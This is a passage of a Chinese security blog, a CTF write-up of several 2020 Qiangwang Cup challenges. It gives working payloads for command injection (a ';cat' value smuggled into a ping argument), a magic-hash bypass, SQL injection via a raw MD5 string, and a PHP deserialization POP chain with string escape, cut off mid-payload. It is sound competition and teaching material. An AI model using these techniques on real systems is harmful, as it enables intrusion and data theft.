class=post-title title=Linux基础期末整理复习>Linux基础期末整理复习</span> <span class=post-date title="2019-12-26 16:50:43">2019/12/26</span></a> <a class="全部文章 线下赛 AWD" href="/2019/12/16/AWD模式总结与2019河南高校网安联赛复现/" data-tag=河南高校网安联赛,复现 data-author><span class=post-title title=AWD模式总结与2019河南高校网安联赛复现>AWD模式总结与2019河南高校网安联赛复现</span> <span class=post-date title="2019-12-16 22:58:25">2019/12/16</span></a> <a class="全部文章 漏洞原理 XXE漏洞" href="/2019/12/02/从XML相关一步一步到XXE漏洞/" data-tag=XML,XML注入,Xpath注入,XXE漏洞 data-author><span class=post-title title=从XML相关一步一步到XXE漏洞>从XML相关一步一步到XXE漏洞</span> <span class=post-date title="2019-12-02 14:47:00">2019/12/02</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/11/16/sqli-labs攻关5(Sta)(Less-39_Less-53)/" data-tag="题目复现,靶场练习,堆叠注入,order by排序注入,异或注入" data-author><span class=post-title title=sqli-labs攻关5(Sta)(Less-39_Less-53)>sqli-labs攻关5(Sta)(Less-39_Less-53)</span> <span class=post-date title="2019-11-16 23:58:43">2019/11/16</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/11/12/sqli-labs攻关4(Adv)(Less-23_Less-38)/" data-tag=靶场练习,二次注入,过滤敏感关键字与WAF绕过,宽字节注入 data-author><span class=post-title title=sqli-labs攻关4(Adv)(Less-23_Less-38)>sqli-labs攻关4(Adv)(Less-23_Less-38)</span> <span class=post-date title="2019-11-12 23:02:46">2019/11/12</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/11/06/sqli-labs攻关3(Less-11-Less-22)/" data-tag=靶场练习,POST型联合查询注入,POST型报错注入,POST型盲注 data-author><span class=post-title title=sqli-labs攻关3(Less-11_Less-22)>sqli-labs攻关3(Less-11_Less-22)</span> <span class=post-date title="2019-11-06 23:55:21">2019/11/06</span></a> <a class="全部文章 漏洞原理 协议层漏洞" href="/2019/10/27/从一道题到HTTP请求走私/" data-tag=题目复现,HTTP,HTTP请求走私 data-author><span class=post-title title=从一道题到HTTP请求走私>从一道题到HTTP请求走私</span> <span class=post-date title="2019-10-27 23:13:44">2019/10/27</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/10/26/SQL盲注的简单分析/" data-tag=SQL盲注 data-author><span class=post-title title=SQL盲注的简单分析>SQL盲注的简单分析</span> <span class=post-date title="2019-10-26 21:50:20">2019/10/26</span></a> <a class="全部文章 漏洞原理 文件操作漏洞" href="/2019/10/19/任意文件读取与下载漏洞/" data-tag=题目复现,任意文件读取漏洞,任意文件下载漏洞 data-author><span class=post-title title=任意文件读取与下载漏洞>任意文件读取与下载漏洞</span> <span class=post-date title="2019-10-19 01:01:11">2019/10/19</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/09/25/SQL注入-报错注入/" data-tag=报错注入 data-author><span class=post-title title=SQL注入-报错注入>SQL注入-报错注入</span> <span class=post-date title="2019-09-25 00:21:26">2019/09/25</span></a> <a class="全部文章 CTF" href="/2019/09/05/攻防世界-Web(进阶区)/" data-tag=CTF,Web,攻防世界 data-author><span class=post-title title=攻防世界-Web(进阶区)>攻防世界-Web(进阶区)</span> <span class=post-date title="2019-09-05 23:46:17">2019/09/05</span></a> <a class="全部文章 CTF" href="/2019/09/02/i春秋-Web(一)/" data-tag=CTF,Web,i春秋 data-author><span class=post-title title=i春秋-Web(一)>i春秋-Web(一)</span> <span class=post-date title="2019-09-02 20:41:21">2019/09/02</span></a> <a class="全部文章 CTF" href="/2019/08/25/南邮-Web(二)/" data-tag=CTF,Web,南邮 data-author><span class=post-title title=南邮-Web(二)>南邮-Web(二)</span> <span class=post-date title="2019-08-25 18:31:58">2019/08/25</span></a> <a class="全部文章 漏洞原理 文件包含漏洞" href="/2019/08/21/文件包含漏洞/" data-tag=漏洞利用,漏洞基础,漏洞绕过,PHP伪协议 data-author><span class=post-title title=文件包含漏洞>文件包含漏洞</span> <span class=post-date title="2019-08-21 21:28:09">2019/08/21</span></a> <a class="全部文章 漏洞原理 信息泄露" href="/2019/08/15/常见Web源码泄露/" data-tag=源码泄露,源码泄露类型 data-author><span class=post-title title=常见Web源码泄露>常见Web源码泄露</span> <span class=post-date title="2019-08-15 20:03:10">2019/08/15</span></a> <a class="全部文章 漏洞原理 反序列化漏洞" href="/2019/08/14/PHP反序列化漏洞/" data-tag=PHP类与对象,序列化与反序列化基础,魔术方法简单利用 data-author><span class=post-title title=PHP反序列化漏洞>PHP反序列化漏洞</span> <span class=post-date title="2019-08-14 23:29:51">2019/08/14</span></a> <a class="全部文章 漏洞原理 命令注入" href="/2019/08/08/命令执行(Command Injection)与代码执行(Code execution)/" data-tag=命令执行,代码执行 data-author><span class=post-title title="命令执行(Command Injection)与代码执行(Code execution)">命令执行(Command Injection)与代码执行(Code execution)</span> <span class=post-date title="2019-08-08 23:11:51">2019/08/08</span></a> <a class="全部文章 CTF" href="/2019/08/06/Crypto-RSA加密/" data-tag=CTF,Crypto,RSA data-author><span class=post-title title=Crypto-RSA加密>Crypto-RSA加密</span> <span class=post-date title="2019-08-06 23:16:34">2019/08/06</span></a> <a class="全部文章 漏洞原理 文件上传漏洞" href="/2019/08/03/文件上传漏洞 学习笔记(二)/" data-tag=白名单绕过,内容绕过,竞争条件绕过 data-author><span class=post-title title="文件上传漏洞 学习笔记(二)">文件上传漏洞 学习笔记(二)</span> <span class=post-date title="2019-08-03 10:22:22">2019/08/03</span></a> <a class="全部文章 CTF" href="/2019/08/02/CTF做题总结(二)/" data-tag=Web,Reverse,SQL,盲注 data-author><span class=post-title title=CTF做题总结(二)>CTF做题总结(二)</span> <span class=post-date title="2019-08-02 11:22:58">2019/08/02</span></a> <a class="全部文章 漏洞原理 文件上传漏洞" href="/2019/07/31/文件上传漏洞 学习笔记(一)/" data-tag=JS绕过,MIME绕过,黑名单绕过 data-author><span class=post-title title="文件上传漏洞 学习笔记(一)">文件上传漏洞 学习笔记(一)</span> <span class=post-date title="2019-07-31 23:01:05">2019/07/31</span></a> <a class="全部文章 CTF" href="/2019/07/25/南邮-Web(一)/" data-tag=CTF,Web,南邮 data-author><span class=post-title title=南邮-Web(一)>南邮-Web(一)</span> <span class=post-date title="2019-07-25 20:05:46">2019/07/25</span></a> <a class="全部文章 CTF" href="/2019/07/21/Crypto-简单加密/" data-tag=CTF,Crypto,简单加密 data-author><span class=post-title title=Crypto-简单加密>Crypto-简单加密</span> <span class=post-date title="2019-07-21 21:30:41">2019/07/21</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/07/19/sqli-labs攻关2(Less-7_Less-10)/" data-tag=导出文件注入,GET型盲注,靶场练习 data-author><span class=post-title title=sqli-labs攻关2(Less-7_Less-10)>sqli-labs攻关2(Less-7_Less-10)</span> <span class=post-date title="2019-07-19 22:05:21">2019/07/19</span></a> <a class="全部文章 CTF" href="/2019/07/17/攻防世界-Web(新手区)/" data-tag=CTF,Web,攻防世界 data-author><span class=post-title title=攻防世界-Web(新手区)>攻防世界-Web(新手区)</span> <span class=post-date title="2019-07-17 21:22:27">2019/07/17</span></a> <a class="全部文章 CTF" href="/2019/07/15/安恒月赛7月-MISC wp/" data-tag=CTF,MISC,安恒 data-author><span class=post-title title="安恒月赛7月-MISC wp">安恒月赛7月-MISC wp</span> <span class=post-date title="2019-07-15 19:33:17">2019/07/15</span></a> <a class="全部文章 漏洞原理 XSS" href="/2019/07/14/XSS漏洞攻关(二)/" data-tag=XSS绕过 data-author><span class=post-title title=XSS漏洞攻关(二)>XSS漏洞攻关(二)</span> <span class=post-date title="2019-07-14 19:01:42">2019/07/14</span></a> <a class="全部文章 CTF" href="/2019/07/12/Crypto-位移编码/" data-tag=CTF,Crypto,移位编码 data-author><span class=post-title title=Crypto-位移编码>Crypto-位移编码</span> <span class=post-date title="2019-07-12 21:32:41">2019/07/12</span></a> <a class="全部文章 CTF" href="/2019/07/10/MISC-图片隐写/" data-tag=CTF,MISC,隐写 data-author><span class=post-title title=MISC-图片隐写>MISC-图片隐写</span> <span class=post-date title="2019-07-10 21:05:43">2019/07/10</span></a> <a class="全部文章 线下赛 AWD" href="/2019/06/24/ISCC2019线下赛总结/" data-tag=ISCC,感悟 data-author><span class=post-title title=ISCC2019线下赛总结>ISCC2019线下赛总结</span> <span class=post-date title="2019-06-24 00:07:01">2019/06/24</span></a> <a class="全部文章 线下赛 AWD" href="/2019/06/19/CTF线下赛AWD攻防准备/" data-tag=准备 data-author><span class=post-title title=CTF线下赛AWD攻防准备>CTF线下赛AWD攻防准备</span> <span class=post-date title="2019-06-19 19:45:58">2019/06/19</span></a> <a class="全部文章 CTF" href="/2019/06/18/BUGKU做题总结(一)/" data-tag=CTF,MISC,BUGKU data-author><span class=post-title title=BUGKU做题总结(一)>BUGKU做题总结(一)</span> <span class=post-date title="2019-06-18 21:11:11">2019/06/18</span></a> <a class="全部文章 漏洞原理 SQL注入" href="/2019/06/10/sqli-labs攻关1(Less-1_Less-6)/" data-tag=靶场练习,GET型联合查询注入,GET型双查询注入 data-author><span class=post-title title=sqli-labs攻关1(Less-1_Less-6)>sqli-labs攻关1(Less-1_Less-6)</span> <span class=post-date title="2019-06-10 19:03:52">2019/06/10</span></a> <a class="全部文章 编程开发 PHP" href="/2019/06/05/Web开发-简单BBS论坛/" data-tag=Web开发,bbs论坛 data-author><span class=post-title title=Web开发-简单BBS论坛>Web开发-简单BBS论坛</span> <span class=post-date title="2019-06-05 17:32:32">2019/06/05</span></a> <a class="全部文章 协议分析 HTTP协议" href="/2019/05/29/HTTP协议基础/" data-tag=HTTP协议,HTTP头流量包 data-author><span class=post-title title=HTTP协议基础>HTTP协议基础</span> <span class=post-date title="2019-05-29 20:39:42">2019/05/29</span></a> <a class="全部文章 CTF" href="/2019/05/27/ISCC-MISC做题总结/" data-tag=CTF,MISC,ISCC data-author><span class=post-title title=ISCC-MISC做题总结>ISCC-MISC做题总结</span> <span class=post-date title="2019-05-27 18:53:14">2019/05/27</span></a> <a class="全部文章 编程开发 PHP" href="/2019/05/04/Web开发-PHP基础篇(四)/" data-tag=MySQL学习,PHP与MySQL交互 data-author><span class=post-title title=Web开发-PHP基础篇(四)>Web开发-PHP基础篇(四)</span> <span class=post-date title="2019-05-04 15:18:37">2019/05/04</span></a> <a class="全部文章 漏洞原理 XSS" href="/2019/04/28/XSS漏洞攻关(一)/" data-tag=XSS基础,XSS绕过 data-author><span class=post-title title=XSS漏洞攻关(一)>XSS漏洞攻关(一)</span> <span class=post-date title="2019-04-28 17:00:44">2019/04/28</span></a> <a class="全部文章 编程开发 PHP" href="/2019/04/27/Web开发-PHP基础篇(三)/" data-tag=正则表达式,日期和时间,图像处理,文件与目录操作,会话控制 data-author><span class=post-title title=Web开发-PHP基础篇(三)>Web开发-PHP基础篇(三)</span> <span class=post-date title="2019-04-27 15:02:06">2019/04/27</span></a> <a class="全部文章 线下赛 团队内部" href="/2019/04/26/一次团队内部比赛经历/" data-tag=BUG,SQL注入,PHP data-author><span class=post-title title=一次团队内部比赛经历>一次团队内部比赛经历</span> <span class=post-date title="2019-04-26 22:59:01">2019/04/26</span></a> <a class="全部文章 编程开发 PHP" href="/2019/04/26/php mysql html css制作带Cookie登陆页面/" data-tag=Web开发,登录和注册功能 data-author><span class=post-title title="php mysql html css制作带Cookie登陆页面">php mysql html css制作带Cookie登陆页面</span> <span class=post-date title="2019-04-26 10:08:26">2019/04/26</span></a> <a class="全部文章 CTF" href="/2019/04/16/CTF做题总结(一)/" data-tag=CTF,MISC,Crypto data-author><span class=post-title title=CTF做题总结(一)>CTF做题总结(一)</span> <span class=post-date title="2019-04-16 11:27:05">2019/04/16</span></a> <a class="全部文章 编程开发 PHP" href="/2019/04/15/Web开发-PHP基础篇(一~二)/" data-tag=基本语法,流程控制,函数,数组,字符串 data-author><span class=post-title title=Web开发-PHP基础篇(一-二)>Web开发-PHP基础篇(一-二)</span> <span class=post-date title="2019-04-15 20:22:18">2019/04/15</span></a> <a class="全部文章 CTF" href="/2019/04/06/MISC-隐写的总结/" data-tag=CTF,MISC,隐写 data-author><span class=post-title title=MISC-隐写的总结>MISC-隐写的总结</span> <span class=post-date title="2019-04-06 18:33:32">2019/04/06</span></a> <a class="全部文章 CTF" href="/2019/04/06/MISC-zip压缩包的总结/" data-tag=CTF,MISC,ZIP data-author><span class=post-title title=MISC-zip压缩包的总结>MISC-zip压缩包的总结</span> <span class=post-date title="2019-04-06 00:21:56">2019/04/06</span></a> <a class="全部文章 编程开发 前端" href="/2019/03/30/Web前端-CSS篇/" data-tag=Web前端,CSS data-author><span class=post-title title=Web前端-CSS篇>Web前端-CSS篇</span> <span class=post-date title="2019-03-30 19:39:32">2019/03/30</span></a> <a class="全部文章 编程开发 前端" href="/2019/03/25/Web前端-HTML篇/" data-tag=Web前端,HTML data-author><span class=post-title title=Web前端-HTML篇>Web前端-HTML篇</span> <span class=post-date title="2019-03-25 22:54:31">2019/03/25</span></a> <a class="全部文章 博客" href="/2019/03/17/Github-Hexo的搭建/" data-tag=Hexo,Github,Hexo搭建 data-author><span class=post-title title=Github-Hexo简单搭建>Github-Hexo简单搭建</span> <span class=post-date title="2019-03-17 12:36:45">2019/03/17</span></a> <a class="全部文章 编程开发 前端" href="/2019/03/15/html基础篇一/" data-tag=Web前端,HTML data-author><span class=post-title title=超文本标记语言html>超文本标记语言html</span> <span class=post-date title="2019-03-15 23:43:10">2019/03/15</span></a> <a class="全部文章 工具学习 phpstudy" href="/2019/03/15/phpstudy-MySQL基础篇一/" data-tag=Web,数据库 data-author><span class=post-title title=phpstudy-MySQL的简单使用以及cmd打开MySQL>phpstudy-MySQL的简单使用以及cmd打开MySQL</span> <span class=post-date title="2019-03-15 23:39:20">2019/03/15</span></a> <a class="全部文章 First" href="/2019/03/12/hello-world/" data-tag data-author><span class=post-title title="Hello world">Hello world</span> <span class=post-date title="2019-03-12 22:33:11">2019/03/12</span></a><div id=no-item-tips></div></nav><div id=outline-list></div></div></div><div class=hide-list><div class=semicircle data-title="切换全屏 快捷键 s"><div class="brackets first"><</div><div class=brackets>&gt;</div></div></div></aside><div id=post><div class=pjax><article id=post-2020强网杯部分题总结与复现 class="article article-type-post" itemscope itemprop=blogPost><h1 class=article-title>2020强网杯部分题总结与复现</h1><div class=article-meta><span class=book><i class="iconfont icon-category"></i> <a data-rel=CTF>CTF</a></span> <span class=tag><i class="iconfont icon-tag"></i> <a class=color4>CTF</a> <a class=color4>强网杯</a> <a class=color4>Web</a> <a class=color5>MISC</a></span></div><div class=article-meta>发布时间 :<time class=date title="最后更新: 2020-08-31 23:50:19">2020-08-31 23:46</time></div><div class=article-meta><span>字数:5.3k</span> <span id=busuanzi_container_page_pv>阅读 :<span id=busuanzi_value_page_pv><span class=count-comment><span class=spinner><div class=cube1></div><div class=cube2></div></span></span></span></span></div><div class=toc-ref><ol class=toc><li class="toc-item toc-level-3"><a class=toc-link href=#0x00-前言><span class=toc-text>0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x01-强网先锋：主动><span class=toc-text>0x01 强网先锋：主动</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x02-强网先锋：Funhash><span class=toc-text>0x02 强网先锋：Funhash</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x03-强网先锋：web辅助><span class=toc-text>0x03 强网先锋：web辅助</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x04-强网先锋：upload><span class=toc-text>0x04 强网先锋：upload</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x05-强网先锋：bank><span class=toc-text>0x05 强网先锋：bank</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x06-Web：half-infiltration><span class=toc-text>0x06 Web：half_infiltration</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x07-MISC：miscstudy><span class=toc-text>0x07 MISC：miscstudy</span></a></li><li class="toc-item toc-level-3"><a class=toc-link href=#0x08-后记><span class=toc-text>0x08 后记</span></a></li></ol><style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-5 i,
+    .toc-level-5 ol {
+        display: none !important;
+    }
+</style></div><div class=article-entry itemprop=articleBody><h3 id=0x00-前言><a href=#0x00-前言 class=headerlink title="0x00 前言"></a>0x00 前言</h3><p>前几天打了个两天一夜的强网杯比赛，整个人都快要起飞了。趁着闲暇之余，总结和复现一下部分题。</p><h3 id=0x01-强网先锋：主动><a href=#0x01-强网先锋：主动 class=headerlink title="0x01 强网先锋：主动"></a>0x01 强网先锋：主动</h3><p><strong>考点：命令执行+绕过黑名单</strong><br>题目源码：</p><pre><code class=php>&lt;?php
+highlight_file(&quot;index.php&quot;);
+if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;]))
+{
+    die(&quot;no flag&quot;);
+}
+system(&quot;ping -c 3 $_GET[ip]&quot;);
+?&gt; </code></pre><p>很简单的一个过滤了flag关键字的命令执行，，直接拼接绕过即可：<br>payload</p><pre><code class=php>?ip=|ls
+?ip=;a=g;cat fla$a.php</code></pre><h3 id=0x02-强网先锋：Funhash><a href=#0x02-强网先锋：Funhash class=headerlink title="0x02 强网先锋：Funhash"></a>0x02 强网先锋：Funhash</h3><p><strong>考点：magic hash+弱类型</strong><br>题目源码：</p><pre><code class=php>&lt;?php
+include &#39;conn.php&#39;;
+highlight_file(&quot;index.php&quot;);
+//level 1
+if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))
+{
+    die(&#39;level 1 failed&#39;);
+}
+
+//level 2
+if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]))
+{
+    die(&#39;level 2 failed&#39;);
+}
+
+//level 3
+$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;
+$result = $mysqli-&gt;query($query);
+$row = $result-&gt;fetch_assoc(); 
+var_dump($row);
+$result-&gt;free();
+$mysqli-&gt;close();
+?&gt; </code></pre><p>一共三关：</p><pre><code class=php>level1：绕过$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])
+level2：绕过$_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;])
+level3：绕过SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;</code></pre><p><strong>第一关：level1</strong><br>level1的意思是：找到一个值，md4加密前后相等，才能绕过。<br>谷歌搜索得到相关知识：<a href=https://crdx.org/post/hsctf-2019-md5-minus-minus target=_blank rel=noopener>HSCTF 2019: MD5–</a><br>主要就是利用了PHP的特性，绕过hash1。<br>里边有一个暴力破解PHP脚本：</p><pre><code class=php>$i = 0;
+$c = 0;
+
+while (true) {
+    if ((++$c % 1000000) == 0) {
+        printf(&quot;.&quot;);
+    }
+    $n = &quot;0e&quot; . $i++;
+    $h = hash(&#39;md4&#39;, $n);
+    if ($n == $h) {
+        printf(&quot;\nFound: $n\n&quot;);
+        break;
+    }
+}</code></pre><p><code>$i</code>每次迭代数值加1，然后对生成的<code>0e</code>前缀字符串<code>$n</code>进行哈希处理和比较。字符串从<code>0e1</code>开始，然后继续进行，直到找到匹配项为止。每百万次迭代将一个点打印到屏幕上标记进度。<br>运行一段时间得到第一个正确的<code>0e</code>字符串：</p><pre><code class=php>Found: 0e251288019</code></pre><p>pyload1</p><pre><code class=php>?hash1=0e251288019</code></pre><p>然后就成功绕过了level1。<br><strong>第二关：level2</strong><br>level2的意思是：(用了<code>===</code>)让传入的两个值不相等且md5加密后相等，才能绕过。<br>利用md5无法处理数组的特性，使用数组绕过<br>pyload2</p><pre><code class=php>?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3</code></pre><p><strong>第三关：level3</strong><br>level3的意思是：绕过<code>md5($_GET[&quot;hash4&quot;],true)</code>实现SQL注入。</p><pre><code class=bash>利用字符串：ffifdyop
+md5后，276f722736c95d99e921722cf9ed621c
+再转成字符串： &#39;or&#39;6</code></pre><p>最终pyload:</p><pre><code class=php>?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3&amp;hash4=ffifdyop</code></pre><h3 id=0x03-强网先锋：web辅助><a href=#0x03-强网先锋：web辅助 class=headerlink title="0x03 强网先锋：web辅助"></a>0x03 强网先锋：web辅助</h3><p><strong>考点：pop链+反序列化逃逸+代码审计</strong><br>题目给了源码，审计代码：</p><pre><code class=php>//index.php
+&lt;?php
+@error_reporting(0);
+require_once &quot;common.php&quot;;
+require_once &quot;class.php&quot;;
+
+if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])){
+    $username = $_GET[&#39;username&#39;];
+    $password = $_GET[&#39;password&#39;];
+    $player = new player($username, $password);
+ //实例化class.php的player类得到对象
+    file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player)));
+    //将$player序列化
+    //write增两个字符
+    //file_put_contents()函数把序列化结果写入文件中
+    echo sprintf(&#39;Welcome %s, your ip is %s\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]);
+}
+else{
+    echo &quot;Please input the username or password!\n&quot;;
+}
+?&gt;</code></pre><pre><code class=php>//class.php
+&lt;?php
+class player{
+    protected $user;
+    protected $pass;
+    protected $admin;
+
+    public function __construct($user, $pass, $admin = 0){ //构造函数
+        $this-&gt;user = $user;
+        $this-&gt;pass = $pass;
+        $this-&gt;admin = $admin;
+    }
+
+    public function get_admin(){
+        return $this-&gt;admin; //定义get_admin()函数，返回$admin变量
+    }
+}
+
+class topsolo{
+    protected $name;
+
+    public function __construct($name = &#39;Riven&#39;){
+        $this-&gt;name = $name;
+    }
+    public function TP(){
+        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){
+        //gettype获取变量的类型
+            $name = $this-&gt;name;
+            $name();   //1、将实例化对象name当作方法使用，触发midsolo类里的__invoke()
+        }
+    }
+    public function __destruct(){//析构函数，反序列化时调用TP()函数
+        $this-&gt;TP();
+    }
+}
+class midsolo{
+    protected $name;
+
+    public function __construct($name){
+        $this-&gt;name = $name;
+    }
+    public function __wakeup(){//属性个数的值大于真实属性个数跳过__wakeup()函数
+        if ($this-&gt;name !== &#39;Yasuo&#39;){
+            $this-&gt;name = &#39;Yasuo&#39;;
+            echo &quot;No Yasuo! No Soul!\n&quot;;
+        }
+    }
+    public function __invoke(){
+        $this-&gt;Gank();//调用Gank()函数
+    }
+    public function Gank(){
+        if (stristr($this-&gt;name, &#39;Yasuo&#39;)){//2、进行字符串比较触发jungle类里的__toString()
+            echo &quot;Are you orphan?\n&quot;;
+        }
+        else{
+            echo &quot;Must Be Yasuo!\n&quot;;
+        }
+    }
+}
+
+class jungle{
+    protected $name = &quot;&quot;;
+
+    public function __construct($name = &quot;Lee Sin&quot;){
+        $this-&gt;name = $name;
+    }
+    public function KS(){
+        system(&quot;cat /flag&quot;);
+    }
+    public function __toString(){
+        $this-&gt;KS(); //调用KS()函数，得到flag
+        return &quot;&quot;;  
+    }
+}
+?&gt;</code></pre><pre><code class=php>//common.php
+&lt;?php
+function read($data){
+    $data = str_replace(&#39;\0*\0&#39;, chr(0).&quot;*&quot;.chr(0), $data);
+ //\0*\0替换成0*0吃掉两个字符
+    return $data;
+}
+function write($data){
+    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\0*\0&#39;, $data);
+ //0*0替换成\0*\0 增加两个字符
+    return $data;
+}
+
+function check($data)
+{
+    if(stristr($data, &#39;name&#39;)!==False){
+ //$data不能包含name
+        die(&quot;Name Pass\n&quot;);
+    }
+    else{
+        return $data;
+    }
+}
+?&gt;</code></pre><pre><code class=php>//play.php
+&lt;?php
+@error_reporting(0);
+require_once &quot;common.php&quot;;
+require_once &quot;class.php&quot;;
+
+@$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
+//file_get_contents将文件读入字符串
+//调用check检查name，调用read吃两个字符
+print_r($player);
+if ($player-&gt;get_admin() === 1){
+ //调用player类的get_admin()函数，获得$admin
+    echo &quot;FPX Champion\n&quot;;
+}
+else{
+    echo &quot;The Shy unstoppable\n&quot;;
+}
+?&gt;</code></pre><p>写一下每个文件里的大致意思：</p><pre><code class=bash>index.php
+1、在 index.php get传入username和password参数，分别赋值给$username和$password变量
+然后将变量传入class.php的player类
+2、对$player进行序列化；增两个字符；写入caches目录下的(ip进行md5加密)的文件名
+
+class.php
+3、player类：
+声明三个保护字段$user、$pass和$admin。
+构造函数： $user=$username；$pass=$password；$admin=0
+get_admin()函数：返回$admin变量到调用位置(即，play.php中判断返回$admin是否为1)
+4、topsolo类：
+声明保护字段$name
+构造函数：$name=&#39;Riven&#39;
+析构函数：调用TP()函数；反序列化时调用
+TP()函数：判断$name变量类型，若为函数或对象触发__invoke()魔术方法
+5、midsolo类：
+__wakeup()魔术方法：属性个数的值大于真实属性个数跳过
+__invoke()魔术方法：调用Gank()函数
+Gank()函数：进行字符串比较触发__toString()魔术方法
+6、jungle类：
+__toString()魔术方法：调用KS()函数
+KS()函数：执行系统命令得到flag
+
+play.php
+7、读取caches目录下文件名是md5加密ip得到的文件；检查不能包含name字符串；\0*\0替换成0*0吃掉两个字符；反序列化
+8、调用player类的get_admin()函数，获得$admin需等于1
+
+common.php
+9、定义read()函数、write()函数和check()函数
+read()函数：\0*\0替换成0*0吃掉两个字符
+write()函数：0*0替换成\0*\0 增加两个字符
+check()函数：$data不能包含name字符串
+
+执行顺序可能是：1-&gt;2-&gt;(9)-&gt;7-&gt;(9)-&gt;3-&gt;   4-&gt;5-&gt;6
+8-&gt;3</code></pre><p>审计完代码后，发现<code>class.php</code>里的topsolo类、midsolo类和jungle类可以构造出打印flag的pop链：</p><blockquote><p>topsolo类里析构函数调用<code>TP()</code>函数，<code>TP()</code>函数判断<code>$name</code>变量类型，若为函数或对象触发midsolo类里的<code>__invoke()</code>魔术方法；<code>__invoke()</code>魔术方法调用<code>Gank()</code>函数，<code>Gank()</code>函数进行字符串比较触发jungle类里的<code>__toString()</code>魔术方法；<code>__toString()</code>魔术方法调用<code>KS()</code>函数，<code>KS()</code>函数执行得到flag的系统命令。</p></blockquote><p>构造POP链进行序列化：</p><pre><code class=php>&lt;?php
+class topsolo{
+    protected $name=&quot;Riven&quot;;
+    public function __construct(){
+        $this-&gt;name = new midsolo();
+    }
+}
+
+class midsolo{
+    protected $name;
+    public function __construct(){
+        $this-&gt;name = new jungle();
+    }
+}
+
+class jungle{
+    protected $name = &quot;Lee Sin&quot;;
+    public function __toString(){
+        system(&quot;cat /flag&quot;);
+        return &quot;&quot;;  
+    }
+}
+$hack=new topsolo();
+print_r(serialize($hack));
+?&gt;</code></pre><p>序列化结果为：</p><pre><code class=php>//protected变量序列化后需要在变量前的星号*左右手动添加不可见字符%00，使其成为%00*%00
+O:7:&quot;topsolo&quot;:1:{s:7:&quot;%00*%00name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;%00*%00name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;%00*%00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>同样对player类进行序列化，得到序列化后的结果：</p><pre><code class=php>O:6:&quot;player&quot;:3:{s:7:&quot;%00*%00user&quot;;N;s:7:&quot;%00*%00pass&quot;;N;s:8:&quot;%00*%00admin&quot;;i:1;}</code></pre><p>源码中只对player类进行反序列化，<code>read()</code>函数将<code>\0*\0</code>替换成<code>0*0</code>吃掉两个字符，于是考虑使用字符串逃逸，破坏序列化字符串的结构，吃掉一部分。<br>pop链序列化字符串长度为109<br><strong>方法一</strong>：<br>吃掉的字符串为<code>&quot;;s:7:&quot;%00*%00pass&quot;;s:109:&quot;</code>，长度为23。进行一次<code>read()</code>函数可以吃掉两个字符，需进行11.5次，很明显不可以。<br>在吃掉的字符串后补一位，即吃掉的字符串为<code>&quot;;s:7:&quot;%00*%00pass&quot;;s:109:&quot;1</code>，长度为24。read()函数进行12次，也就是需要12个<code>%00*%00</code>。<br><img src=http://img-blog.csdnimg.cn/20200825170213122.png#pic_center alt=在这里插入图片描述><br><strong>方法二</strong>：<br>吃掉的字符串为<code>&quot;;s:7:&quot;%00*%00pass&quot;;s:109:</code>，长度为22。read()函数进行11次，也就是需要11个<code>%00*%00</code>。<br><img src=http://img-blog.csdnimg.cn/20200825164918924.png#pic_center alt=在这里插入图片描述><br>还需要注意的是要跳过midsolo类里的__wakeup()魔术方法，将原本属性个数的值1改大一些，如：2<br>源码中check函数过滤了关键字<code>name</code>，将序列化字符串中表示变量(名)为字符串的小写<code>s</code>换为大写<code>S</code>，即可解析变量(名)中的16进制<code>\6e\61\6d\65</code>(即name)。因为<code>read()</code>函数是将<code>\0*\0</code>替换成<code>0*0</code>吃掉两个字符，所以需要将username里的<code>%00</code>换成<code>\0</code>，password里为了防止被吃，不要换或将<code>%00</code>换成<code>\00</code>。<br><strong>方法一构造payload</strong>：<br>需要read()函数进行12次，也就是需要12个<code>%00*%00</code></p><pre><code class=php>username=qwzf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
